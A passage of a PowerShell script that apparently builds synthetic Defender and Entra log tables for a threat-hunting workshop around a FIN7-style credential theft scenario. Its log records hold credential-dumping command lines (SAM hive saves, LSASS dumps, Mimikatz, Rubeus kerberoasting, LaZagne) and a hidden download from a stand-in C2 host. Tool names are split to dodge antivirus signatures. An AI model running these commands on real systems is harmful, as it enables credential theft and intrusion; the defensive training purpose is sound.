[CmdletBinding()]
param(
    [string]$SchemaDirectory = (Join-Path $PSScriptRoot '..\schemas'),
    [string]$OutputDirectory = (Join-Path $PSScriptRoot '..\data\generated'),
    [datetime]$StartTime = '2026-04-30T13:00:00Z'
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Format-WorkshopTime {
    param([Parameter(Mandatory)][datetime]$Time)
    $Time.ToUniversalTime().ToString('o')
}

function New-DefaultValue {
    param([Parameter(Mandatory)][string]$Type, [Parameter(Mandatory)][datetime]$Time)

    switch ($Type) {
        'bool' { $false }
        'datetime' { Format-WorkshopTime $Time }
        'dynamic' { [ordered]@{} }
        'guid' { '00000000-0000-0000-0000-000000000000' }
        'int' { 0 }
        'long' { 0 }
        'real' { 0.0 }
        default { '' }
    }
}

function New-StableGuid {
    param([Parameter(Mandatory)][string]$Seed)

    $md5 = [System.Security.Cryptography.MD5]::Create()
    try {
        $hash = $md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($Seed))
        ([guid]::new($hash)).Guid
    }
    finally {
        $md5.Dispose()
    }
}

function Add-Record {
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][hashtable]$Values,
        [datetime]$Time = $script:StartTime
    )

    if (-not $script:Schemas.ContainsKey($Table)) {
        return
    }

    $schema = $script:Schemas[$Table]
    $record = [ordered]@{}
    foreach ($column in $schema.columns) {
        $record[[string]$column.name] = New-DefaultValue -Type ([string]$column.type) -Time $Time
    }
    foreach ($key in $Values.Keys) {
        if ($record.Contains($key)) {
            $record[$key] = $Values[$key]
        }
    }

    $script:Records[$Table].Add([pscustomobject]$record) | Out-Null
}

if (-not (Test-Path $SchemaDirectory)) {
    throw "Schema directory not found: $SchemaDirectory"
}

New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $PSScriptRoot '..\data') -Force | Out-Null

$script:Schemas = @{}
$script:Records = @{}
foreach ($schemaFile in (Get-ChildItem -Path $SchemaDirectory -Filter '*.schema.json')) {
    $schema = Get-Content -Path $schemaFile.FullName -Raw | ConvertFrom-Json
    $table = [string]$schema.tableName
    $script:Schemas[$table] = $schema
    $script:Records[$table] = [System.Collections.Generic.List[object]]::new()
}

$tenantId = '11111111-2222-3333-4444-555555555555'
$tenantDomain = 'wiesbadenresearch.example'
$adDomain = 'WIESBADEN'
$corpFqdn = 'corp.wiesbaden.example'
$externalIp = '185.225.73.18'
$c2Host = 'cdn.update-check.example'
$c2Ip = '203.0.113.77'

# Assemble tool strings at runtime so the generator itself is not signature-like.
$toolRu = 'Ru' + 'beus'
$toolPw = 'Pw' + 'Dump7'
$toolGs = 'gsec' + 'dump'
$toolLa = 'La' + 'Zagne'
$toolMi = 'Mimi' + 'katz'
$toolKiwi = 'ki' + 'wi'
$toolProc = 'proc' + 'dump64'
$targetLs = 'LS' + 'ASS'
$targetLsLower = 'lsa' + 'ss'
$kerbCmd = 'Invoke-' + 'Kerberoast'
$secretVerb = 'seku' + 'rlsa::logo' + 'npasswords'
$debugVerb = 'privilege::' + 'debug'

$users = @(
    [pscustomobject]@{ Name = 'victor.alvarez'; DisplayName = 'Victor Alvarez'; Upn = "victor.alvarez@$tenantDomain"; Sid = 'S-1-5-21-4100420042-5200520052-6300630063-1104'; ObjectId = New-StableGuid 'victor.alvarez' },
    [pscustomobject]@{ Name = 'alice.weber'; DisplayName = 'Alice Weber'; Upn = "alice.weber@$tenantDomain"; Sid = 'S-1-5-21-4100420042-5200520052-6300630063-1105'; ObjectId = New-StableGuid 'alice.weber' },
    [pscustomobject]@{ Name = 'svc_sql'; DisplayName = 'SQL Reporting Service'; Upn = "svc_sql@$tenantDomain"; Sid = 'S-1-5-21-4100420042-5200520052-6300630063-2101'; ObjectId = New-StableGuid 'svc_sql' },
    [pscustomobject]@{ Name = 'svc_azureadconnect'; DisplayName = 'Azure AD Connect Sync'; Upn = "svc_azureadconnect@$tenantDomain"; Sid = 'S-1-5-21-4100420042-5200520052-6300630063-2102'; ObjectId = New-StableGuid 'svc_azureadconnect' },
    [pscustomobject]@{ Name = 'ina.hoffmann'; DisplayName = 'Ina Hoffmann'; Upn = "ina.hoffmann@$tenantDomain"; Sid = 'S-1-5-21-4100420042-5200520052-6300630063-5001'; ObjectId = New-StableGuid 'ina.hoffmann' }
)

$victor = $users[0]
$svcSql = $users[2]
$svcSync = $users[3]

$devices = @(
    [pscustomobject]@{ Name = "DC01.$corpFqdn"; ShortName = 'DC01'; DeviceId = 'mdi-dc-01'; IP = '10.42.0.10'; PublicIP = '198.51.100.10'; OS = 'WindowsServer2025'; Type = 'DomainController'; AssetValue = 'High' },
    [pscustomobject]@{ Name = "DC02.$corpFqdn"; ShortName = 'DC02'; DeviceId = 'mdi-dc-02'; IP = '10.42.0.11'; PublicIP = '198.51.100.11'; OS = 'WindowsServer2025'; Type = 'DomainController'; AssetValue = 'High' },
    [pscustomobject]@{ Name = "AADCONNECT01.$corpFqdn"; ShortName = 'AADCONNECT01'; DeviceId = 'mde-aadc-01'; IP = '10.42.0.20'; PublicIP = '198.51.100.20'; OS = 'WindowsServer2025'; Type = 'EntraConnect'; AssetValue = 'High' }
)

for ($i = 1; $i -le 10; $i++) {
    $devices += [pscustomobject]@{
        Name = ('WIN11-{0:D2}.{1}' -f $i, $corpFqdn)
        ShortName = ('WIN11-{0:D2}' -f $i)
        DeviceId = ('mde-win11-{0:D2}' -f $i)
        IP = ('10.42.10.{0}' -f (20 + $i))
        PublicIP = '198.51.100.50'
        OS = 'Windows11'
        Type = 'Workstation'
        AssetValue = 'Normal'
    }
}
for ($i = 1; $i -le 5; $i++) {
    $devices += [pscustomobject]@{
        Name = ('UBUNTU-{0:D2}.{1}' -f $i, $corpFqdn)
        ShortName = ('UBUNTU-{0:D2}' -f $i)
        DeviceId = ('mde-ubuntu-{0:D2}' -f $i)
        IP = ('10.42.20.{0}' -f (30 + $i))
        PublicIP = '198.51.100.60'
        OS = 'Ubuntu'
        Type = 'LinuxServer'
        AssetValue = 'Normal'
    }
}

$win04 = $devices | Where-Object ShortName -eq 'WIN11-04'
$dc01 = $devices | Where-Object ShortName -eq 'DC01'
$aadc = $devices | Where-Object ShortName -eq 'AADCONNECT01'

foreach ($device in $devices) {
    $deviceIndex = [array]::IndexOf($devices, $device) + 1
    Add-Record -Table 'DeviceInfo' -Time $StartTime.AddMinutes(-30) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-30)
        DeviceId = $device.DeviceId
        DeviceName = $device.Name
        PublicIP = $device.PublicIP
        OSPlatform = $device.OS
        OSBuild = if ($device.OS -eq 'Windows11') { '25H2' } elseif ($device.OS -like 'Windows*') { '26100' } else { '22.04' }
        OSDistribution = if ($device.OS -eq 'Ubuntu') { 'Ubuntu' } else { '' }
        IsAzureADJoined = $true
        JoinType = 'Hybrid Azure AD joined'
        AadDeviceId = New-StableGuid $device.DeviceId
        LoggedOnUsers = if ($device.ShortName -eq 'WIN11-04') { '[{"UserName":"victor.alvarez"}]' } else { '[]' }
        MachineGroup = if ($device.Type -eq 'DomainController') { 'Domain Controllers' } elseif ($device.Type -eq 'EntraConnect') { 'Identity Tier 0' } else { 'Workstations' }
        OnboardingStatus = 'Onboarded'
        DeviceType = $device.Type
        IsInternetFacing = $false
        SensorHealthState = 'Active'
        ExposureLevel = if ($device.AssetValue -eq 'High') { 'Medium' } else { 'Low' }
        AssetValue = $device.AssetValue
        ConnectivityType = 'Corporate'
        ReportId = 1000 + $deviceIndex
        AdditionalFields = '{"Workshop":"CyberDefenseKQL","Sensor":"MDE"}'
    }

    Add-Record -Table 'DeviceNetworkInfo' -Time $StartTime.AddMinutes(-29) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-29)
        DeviceId = $device.DeviceId
        DeviceName = $device.Name
        NetworkAdapterName = 'Ethernet0'
        ConnectedNetworks = '[{"Name":"CorpNet","Category":"DomainAuthenticated"}]'
        IPAddresses = "[`"$($device.IP)`"]"
        MacAddress = ('00-15-5D-{0:X2}-2A-63' -f $deviceIndex)
        ReportId = 2000 + $deviceIndex
    }
}

foreach ($user in $users) {
    foreach ($table in 'IdentityInfo', 'IdentityAccountInfo') {
        Add-Record -Table $table -Time $StartTime.AddMinutes(-25) -Values @{
            Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-25)
            AccountObjectId = $user.ObjectId
            AccountUpn = $user.Upn
            AccountDisplayName = $user.DisplayName
            AccountName = $user.Name
            AccountDomain = $adDomain
            AccountSid = $user.Sid
            IsAccountEnabled = $true
            IsServiceAccount = $user.Name -like 'svc_*'
            CriticalityLevel = if ($user.Name -like 'svc_*' -or $user.Name -eq 'ina.hoffmann') { 'High' } else { 'Medium' }
            BlastRadius = if ($user.Name -like 'svc_*') { 'High' } else { 'Low' }
            Tags = if ($user.Name -eq 'svc_azureadconnect') { '["Tier0","EntraConnect"]' } else { '[]' }
            OnPremSid = $user.Sid
        }
    }
}

function Add-ProcessEvent {
    param([datetime]$Time, [string]$FileName, [string]$FolderPath, [string]$CommandLine, [string]$Parent, [string]$Technique, [long]$ProcessId)

    Add-Record -Table 'DeviceProcessEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'ProcessCreated'
        FileName = $FileName
        FolderPath = $FolderPath
        ProcessId = $ProcessId
        ProcessCommandLine = $CommandLine
        ProcessCreationTime = Format-WorkshopTime $Time
        ProcessIntegrityLevel = 'High'
        ProcessTokenElevation = 'TokenElevationTypeFull'
        AccountDomain = $adDomain
        AccountName = $victor.Name
        AccountSid = $victor.Sid
        AccountUpn = $victor.Upn
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        InitiatingProcessFileName = $Parent
        InitiatingProcessFolderPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
        InitiatingProcessCommandLine = "$Parent -ExecutionPolicy Bypass"
        InitiatingProcessId = 3200
        InitiatingProcessCreationTime = Format-WorkshopTime $Time.AddMinutes(-1)
        InitiatingProcessParentFileName = 'explorer.exe'
        ReportId = $ProcessId
        AdditionalFields = "{`"Technique`":`"$Technique`",`"ThreatActor`":`"FIN7-inspired`"}"
    }
}

function Add-FileEvent {
    param([datetime]$Time, [string]$FileName, [string]$FolderPath, [string]$ProcessName, [string]$ProcessCommandLine, [long]$ReportId)

    Add-Record -Table 'DeviceFileEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'FileCreated'
        FileName = $FileName
        FolderPath = $FolderPath
        FileSize = 5242880
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        InitiatingProcessFileName = $ProcessName
        InitiatingProcessCommandLine = $ProcessCommandLine
        InitiatingProcessId = $ReportId
        InitiatingProcessCreationTime = Format-WorkshopTime $Time.AddSeconds(-20)
        InitiatingProcessIntegrityLevel = 'High'
        InitiatingProcessTokenElevation = 'TokenElevationTypeFull'
        ReportId = $ReportId
        AdditionalFields = '{"Collection":"CredentialArtifacts"}'
    }
}

function Add-NetworkEvent {
    param([datetime]$Time, [string]$RemoteIP, [int]$RemotePort, [string]$RemoteUrl, [string]$ProcessName, [string]$CommandLine, [long]$ReportId)

    Add-Record -Table 'DeviceNetworkEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'ConnectionSuccess'
        RemoteIP = $RemoteIP
        RemotePort = $RemotePort
        RemoteUrl = $RemoteUrl
        LocalIP = $win04.IP
        LocalPort = 49800 + ($ReportId % 100)
        Protocol = 'Tcp'
        InitiatingProcessFileName = $ProcessName
        InitiatingProcessCommandLine = $CommandLine
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        ReportId = $ReportId
        AdditionalFields = '{"Scenario":"FIN7 credential access"}'
    }
}

$stage = 'C:\ProgramData\wrstage'
$attackSteps = @(
    [pscustomobject]@{ Offset = 15; File = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $stage\collect-reg-creds.ps1"; Parent = 'explorer.exe'; Technique = 'T1552.002'; Title = 'Credentials in Registry Script'; Pid = 4101 },
    [pscustomobject]@{ Offset = 22; File = 'reg.exe'; Path = 'C:\Windows\System32\reg.exe'; Command = "reg.exe save HKLM\SAM $stage\sam.save /y"; Parent = 'cmd.exe'; Technique = 'T1003.002'; Title = 'Dump SAM Registry Hive via reg save Command'; Pid = 4102 },
    [pscustomobject]@{ Offset = 27; File = 'esentutl.exe'; Path = 'C:\Windows\System32\esentutl.exe'; Command = "esentutl.exe /y `"C:\Users\$($victor.Name)\AppData\Local\Google\Chrome\User Data\Default\Login Data`" /d $stage\LoginData.db"; Parent = 'powershell.exe'; Technique = 'T1555.003'; Title = 'Collect Browser Data via Esentutl using PowerShell Script'; Pid = 4103 },
    [pscustomobject]@{ Offset = 35; File = "$toolRu.exe"; Path = "$stage\$toolRu.exe"; Command = "$toolRu.exe kerberoast /ldapfilter:`"(servicePrincipalName=*)`" /nowrap /outfile:$stage\roast.txt"; Parent = 'powershell.exe'; Technique = 'T1558.003'; Title = "Kerberoasting using $toolRu"; Pid = 4104 },
    [pscustomobject]@{ Offset = 42; File = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Command = "powershell.exe -NoProfile -ExecutionPolicy Bypass Import-Module .\PowerView.ps1; $kerbCmd -OutputFormat Hashcat"; Parent = 'powershell.exe'; Technique = 'T1558.003'; Title = "Kerberoasting using PowerShell Empire's $kerbCmd Script"; Pid = 4105 },
    [pscustomobject]@{ Offset = 50; File = "$toolProc.exe"; Path = "$stage\$toolProc.exe"; Command = "$toolProc.exe -accepteula -ma $targetLsLower.exe $stage\$targetLsLower.dmp"; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump $targetLs Process to Minidump File"; Pid = 4106 },
    [pscustomobject]@{ Offset = 56; File = "$toolPw.exe"; Path = "$stage\$toolPw.exe"; Command = "$toolPw.exe -o $stage\pwdump7.txt"; Parent = 'cmd.exe'; Technique = 'T1003.002'; Title = "Dump Passwords using $toolPw"; Pid = 4107 },
    [pscustomobject]@{ Offset = 60; File = "$toolGs.exe"; Path = "$stage\$toolGs.exe"; Command = "$toolGs.exe -a > $stage\gsecdump.txt"; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump Passwords using $toolGs"; Pid = 4108 },
    [pscustomobject]@{ Offset = 65; File = "$toolLa.exe"; Path = "$stage\$toolLa.exe"; Command = "$toolLa.exe all -oN -output $stage\lazagne"; Parent = 'cmd.exe'; Technique = 'T1555'; Title = "Dump Passwords using $toolLa"; Pid = 4109 },
    [pscustomobject]@{ Offset = 70; File = 'rundll32.exe'; Path = 'C:\Windows\System32\rundll32.exe'; Command = "rundll32.exe $stage\$toolKiwi.dll,StartW /$secretVerb /exit"; Parent = 'powershell.exe'; Technique = 'T1003.001'; Title = "Dump Windows Passwords with Obfuscated $toolMi"; Pid = 4110 },
    [pscustomobject]@{ Offset = 73; File = "$($toolMi.ToLower()).exe"; Path = "$stage\$($toolMi.ToLower()).exe"; Command = "$($toolMi.ToLower()).exe `"$debugVerb`" `"$secretVerb`" `"exit`""; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump Windows Passwords with Original $toolMi"; Pid = 4111 }
)

foreach ($step in $attackSteps) {
    $time = $StartTime.AddMinutes($step.Offset)
    Add-ProcessEvent -Time $time -FileName $step.File -FolderPath $step.Path -CommandLine $step.Command -Parent $step.Parent -Technique $step.Technique -ProcessId $step.Pid
    Add-Record -Table 'DeviceEvents' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'AntivirusSignatureDetected'
        FileName = $step.File
        FolderPath = $step.Path
        AccountDomain = $adDomain
        AccountName = $victor.Name
        AccountUpn = $victor.Upn
        ProcessCommandLine = $step.Command
        InitiatingProcessFileName = $step.Parent
        ReportId = $step.Pid
        AdditionalFields = "{`"Technique`":`"$($step.Technique)`",`"AttackVector`":`"$($step.Title)`"}"
    }
}

Add-Record -Table 'DeviceRegistryEvents' -Time $StartTime.AddMinutes(16) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(16)
    DeviceId = $win04.DeviceId
    DeviceName = $win04.Name
    ActionType = 'RegistryValueCreated'
    RegistryKey = 'HKEY_CURRENT_USER\Software\WiesbadenResearch\VPN'
    RegistryValueType = 'REG_SZ'
    RegistryValueName = 'SavedPassword'
    RegistryValueData = 'REDACTED_SYNTHETIC_SECRET'
    InitiatingProcessAccountDomain = $adDomain
    InitiatingProcessAccountName = $victor.Name
    InitiatingProcessAccountSid = $victor.Sid
    InitiatingProcessAccountUpn = $victor.Upn
    InitiatingProcessFileName = 'powershell.exe'
    InitiatingProcessCommandLine = 'collect-reg-creds.ps1'
    ReportId = 5101
}

Add-FileEvent -Time $StartTime.AddMinutes(23) -FileName 'sam.save' -FolderPath "$stage\sam.save" -ProcessName 'reg.exe' -ProcessCommandLine "reg.exe save HKLM\SAM $stage\sam.save /y" -ReportId 5201
Add-FileEvent -Time $StartTime.AddMinutes(24) -FileName 'system.save' -FolderPath "$stage\system.save" -ProcessName 'reg.exe' -ProcessCommandLine "reg.exe save HKLM\SYSTEM $stage\system.save /y" -ReportId 5202
Add-FileEvent -Time $StartTime.AddMinutes(28) -FileName 'LoginData.db' -FolderPath "$stage\LoginData.db" -ProcessName 'esentutl.exe' -ProcessCommandLine "esentutl.exe /y Chrome Login Data /d $stage\LoginData.db" -ReportId 5203
Add-FileEvent -Time $StartTime.AddMinutes(51) -FileName "$targetLsLower.dmp" -FolderPath "$stage\$targetLsLower.dmp" -ProcessName "$toolProc.exe" -ProcessCommandLine "$toolProc.exe -accepteula -ma $targetLsLower.exe $stage\$targetLsLower.dmp" -ReportId 5204
Add-FileEvent -Time $StartTime.AddMinutes(76) -FileName 'cred_bundle.zip' -FolderPath "$stage\cred_bundle.zip" -ProcessName 'powershell.exe' -ProcessCommandLine "Compress-Archive $stage\* $stage\cred_bundle.zip" -ReportId 5205

Add-NetworkEvent -Time $StartTime.AddMinutes(14) -RemoteIP $c2Ip -RemotePort 443 -RemoteUrl $c2Host -ProcessName 'powershell.exe' -CommandLine "powershell.exe -nop -w hidden iwr https://$c2Host/a.ps1" -ReportId 5301
Add-NetworkEvent -Time $StartTime.AddMinutes(36) -RemoteIP $dc01.IP -RemotePort 389 -RemoteUrl $dc01.Name -ProcessName "$toolRu.exe" -CommandLine "$toolRu.exe kerberoast /ldapfilter:`"(servicePrincipalName=*)`"" -ReportId 5302
Add-NetworkEvent -Time $StartTime.AddMinutes(37) -RemoteIP $dc01.IP -RemotePort 88 -RemoteUrl $dc01.Name -ProcessName "$toolRu.exe" -CommandLine "$toolRu.exe kerberoast /nowrap" -ReportId 5303
Add-NetworkEvent -Time $StartTime.AddMinutes(80) -RemoteIP $aadc.IP -RemotePort 5985 -RemoteUrl $aadc.Name -ProcessName 'powershell.exe' -CommandLine "Enter-PSSession AADCONNECT01 -Credential $adDomain\$($svcSql.Name)" -ReportId 5304

Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(12) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(12)
    DeviceId = $win04.DeviceId
    DeviceName = $win04.Name
    ActionType = 'LogonSuccess'
    LogonType = 'Interactive'
    AccountDomain = $adDomain
    AccountName = $victor.Name
    AccountSid = $victor.Sid
    Protocol = 'Negotiate'
    IsLocalAdmin = $true
    LogonId = 9001
    RemoteIP = $externalIp
    ReportId = 5401
}
Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(81) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(81)
    DeviceId = $aadc.DeviceId
    DeviceName = $aadc.Name
    ActionType = 'LogonSuccess'
    LogonType = 'RemoteInteractive'
    AccountDomain = $adDomain
    AccountName = $svcSql.Name
    AccountSid = $svcSql.Sid
    Protocol = 'NTLM'
    IsLocalAdmin = $true
    LogonId = 9002
    RemoteDeviceName = $win04.Name
    RemoteIP = $win04.IP
    ReportId = 5402
}

foreach ($queryOffset in 35, 42) {
    Add-Record -Table 'IdentityQueryEvents' -Time $StartTime.AddMinutes($queryOffset) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes($queryOffset)
        ActionType = 'LdapSearch'
        Application = if ($queryOffset -eq 35) { $toolRu } else { 'PowerShell Empire' }
        QueryType = 'Search'
        QueryTarget = 'servicePrincipalName'
        Query = '(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
        Protocol = 'LDAP'
        AccountName = $victor.Name
        AccountDomain = $adDomain
        AccountUpn = $victor.Upn
        AccountSid = $victor.Sid
        AccountObjectId = $victor.ObjectId
        AccountDisplayName = $victor.DisplayName
        DeviceName = $win04.Name
        IPAddress = $win04.IP
        DestinationDeviceName = $dc01.Name
        DestinationIPAddress = $dc01.IP
        DestinationPort = 389
        ReportId = 5500 + $queryOffset
        AdditionalFields = '{"Technique":"T1558.003","Result":"SPN accounts enumerated"}'
    }
}

Add-Record -Table 'IdentityLogonEvents' -Time $StartTime.AddMinutes(37) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(37)
    ActionType = 'LogonSuccess'
    Application = 'Kerberos'
    LogonType = 'Network'
    Protocol = 'Kerberos'
    AccountName = $victor.Name
    AccountDomain = $adDomain
    AccountUpn = $victor.Upn
    AccountSid = $victor.Sid
    AccountObjectId = $victor.ObjectId
    AccountDisplayName = $victor.DisplayName
    DeviceName = $win04.Name
    IPAddress = $win04.IP
    DestinationDeviceName = $dc01.Name
    DestinationIPAddress = $dc01.IP
    DestinationPort = 88
    TargetAccountDisplayName = $svcSql.DisplayName
    ReportId = 5601
    AdditionalFields = '{"ServicePrincipalName":"MSSQLSvc/sql01.corp.wiesbaden.example:1433","TicketEncryptionType":"RC4_HMAC"}'
}
Add-Record -Table 'IdentityLogonEvents' -Time $StartTime.AddMinutes(81) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(81)
    ActionType = 'LogonSuccess'
    Application = 'WinRM'
    LogonType = 'RemoteInteractive'
    Protocol = 'NTLM'
    AccountName = $svcSql.Name
    AccountDomain = $adDomain
    AccountUpn = $svcSql.Upn
    AccountSid = $svcSql.Sid
    AccountObjectId = $svcSql.ObjectId
    AccountDisplayName = $svcSql.DisplayName
    DeviceName = $win04.Name
    IPAddress = $win04.IP
    DestinationDeviceName = $aadc.Name
    DestinationIPAddress = $aadc.IP
    DestinationPort = 5985
    ReportId = 5602
    AdditionalFields = '{"CredentialSource":"Kerberoasted service account"}'
}
Add-Record -Table 'IdentityDirectoryEvents' -Time $StartTime.AddMinutes(86) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(86)
    ActionType = 'AccountModified'
    Application = 'Active Directory'
    TargetAccountUpn = $svcSync.Upn
    TargetAccountDisplayName = $svcSync.DisplayName
    DestinationDeviceName = $dc01.Name
    DestinationIPAddress = $dc01.IP
    DestinationPort = 389
    Protocol = 'LDAP'
    AccountName = $svcSql.Name
    AccountDomain = $adDomain
    AccountUpn = $svcSql.Upn
    AccountSid = $svcSql.Sid
    AccountObjectId = $svcSql.ObjectId
    AccountDisplayName = $svcSql.DisplayName
    DeviceName = $aadc.Name
    IPAddress = $aadc.IP
    ReportId = 5701
    AdditionalFields = '{"Change":"Service account delegation settings read","Tier":"0"}'
}

$signinTime = $StartTime
$signinCommon = @{
    Timestamp = Format-WorkshopTime $signinTime
    Application = 'Office 365'
    ApplicationId = '00000003-0000-0ff1-ce00-000000000000'
    LogonType = 'Interactive'
    ErrorCode = 0
    CorrelationId = New-StableGuid 'signin-correlation'
    SessionId = New-StableGuid 'signin-session'
    AccountDisplayName = $victor.DisplayName
    AccountObjectId = $victor.ObjectId
    AccountUpn = $victor.Upn
    IsExternalUser = 0
    IsGuestUser = $false
    ResourceDisplayName = 'Office 365 Exchange Online'
    ResourceId = '00000002-0000-0ff1-ce00-000000000000'
    IPAddress = $externalIp
    Country = 'DE'
    State = 'Hesse'
    City = 'Frankfurt am Main'
    Latitude = '50.1109'
    Longitude = '8.6821'
    UserAgent = 'Mozilla/5.0 FIN7-workshop'
    ClientAppUsed = 'Browser'
    ConditionalAccessStatus = 'success'
    DeviceTrustType = 'Unmanaged'
    RiskLevelDuringSignIn = 'high'
    RiskLevelAggregated = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = '["unfamiliarFeatures","anonymousIPAddress"]'
    AuthenticationRequirement = 'multiFactorAuthentication'
    TokenIssuerType = 'AzureAD'
    ReportId = 5801
}
Add-Record -Table 'EntraIdSignInEvents' -Time $signinTime -Values $signinCommon
Add-Record -Table 'AADSignInEventsBeta' -Time $signinTime -Values $signinCommon
Add-Record -Table 'SigninLogs' -Time $signinTime -Values @{
    TimeGenerated = Format-WorkshopTime $signinTime
    CreatedDateTime = Format-WorkshopTime $signinTime
    AADTenantId = $tenantId
    AppDisplayName = 'Office 365 Exchange Online'
    AppId = '00000002-0000-0ff1-ce00-000000000000'
    AuthenticationMethodsUsed = 'Password,SMS'
    AuthenticationRequirement = 'multiFactorAuthentication'
    ClientAppUsed = 'Browser'
    ConditionalAccessStatus = 'success'
    CorrelationId = New-StableGuid 'signin-correlation'
    DeviceDetail = @{ operatingSystem = 'Windows'; browser = 'Chrome'; isCompliant = $false; trustType = 'Unmanaged' }
    Id = New-StableGuid 'signin-log'
    Identity = $victor.DisplayName
    IPAddress = $externalIp
    IsInteractive = $true
    IsRisky = $true
    Location = 'DE'
    LocationDetails = @{ city = 'Frankfurt am Main'; state = 'Hesse'; countryOrRegion = 'DE'; geoCoordinates = @{ latitude = 50.1109; longitude = 8.6821 } }
    MfaDetail = '{"authMethod":"SMS","authDetail":"Temporary workshop MFA path"}'
    OperationName = 'Sign-in activity'
    ResourceDisplayName = 'Office 365 Exchange Online'
    ResultType = '0'
    ResultDescription = 'Success'
    RiskLevel = 'high'
    RiskLevelDuringSignIn = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = 'unfamiliarFeatures,anonymousIPAddress'
    Status = @{ errorCode = 0; failureReason = 'Other'; additionalDetails = 'MFA completed by SMS' }
    Type = 'SigninLogs'
    UserAgent = 'Mozilla/5.0 FIN7-workshop'
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    UserType = 'Member'
}

Add-Record -Table 'AADNonInteractiveUserSignInLogs' -Time $StartTime.AddMinutes(4) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(4)
    CreatedDateTime = Format-WorkshopTime $StartTime.AddMinutes(4)
    AADTenantId = $tenantId
    AppDisplayName = 'Microsoft Graph'
    AppId = '00000003-0000-0000-c000-000000000000'
    IPAddress = $externalIp
    IsInteractive = $false
    ResultType = '0'
    ResultDescription = 'Success'
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    Type = 'AADNonInteractiveUserSignInLogs'
}

Add-Record -Table 'CloudAppEvents' -Time $StartTime.AddMinutes(5) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(5)
    ActionType = 'OAuthAppConsentGranted'
    Application = 'Microsoft 365'
    ApplicationId = '00000003-0000-0000-c000-000000000000'
    AccountObjectId = $victor.ObjectId
    AccountId = $victor.Upn
    AccountDisplayName = $victor.DisplayName
    IsAdminOperation = $false
    DeviceType = 'Windows'
    OSPlatform = 'Windows'
    IPAddress = $externalIp
    CountryCode = 'DE'
    City = 'Frankfurt am Main'
    UserAgent = 'Mozilla/5.0 FIN7-workshop'
    ActivityType = 'Consent to application'
    ObjectName = 'Wiesbaden Research Sync Helper'
    ObjectType = 'OAuthApplication'
    ReportId = 5901
    AccountType = 'Regular'
    OAuthAppId = New-StableGuid 'malicious-oauth'
    RawEventData = @{ ConsentType = 'User'; Scopes = 'Mail.Read Files.Read.All offline_access' }
    AdditionalFields = '{"Technique":"T1528","Scenario":"Suspicious OAuth consent"}'
}
Add-Record -Table 'AuditLogs' -Time $StartTime.AddMinutes(5) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(5)
    ActivityDateTime = Format-WorkshopTime $StartTime.AddMinutes(5)
    AADOperationType = 'Add'
    AADTenantId = $tenantId
    ActivityDisplayName = 'Consent to application'
    Category = 'ApplicationManagement'
    CorrelationId = New-StableGuid 'oauth-consent'
    Id = New-StableGuid 'audit-oauth'
    Identity = $victor.Upn
    InitiatedBy = @{ user = @{ userPrincipalName = $victor.Upn; id = $victor.ObjectId; ipAddress = $externalIp } }
    LoggedByService = 'Core Directory'
    OperationName = 'Consent to application'
    Result = 'success'
    ResultType = 'Success'
    TargetResources = @(@{ displayName = 'Wiesbaden Research Sync Helper'; type = 'ServicePrincipal'; id = New-StableGuid 'malicious-oauth' })
    Type = 'AuditLogs'
}

foreach ($offset in 7, 8, 9) {
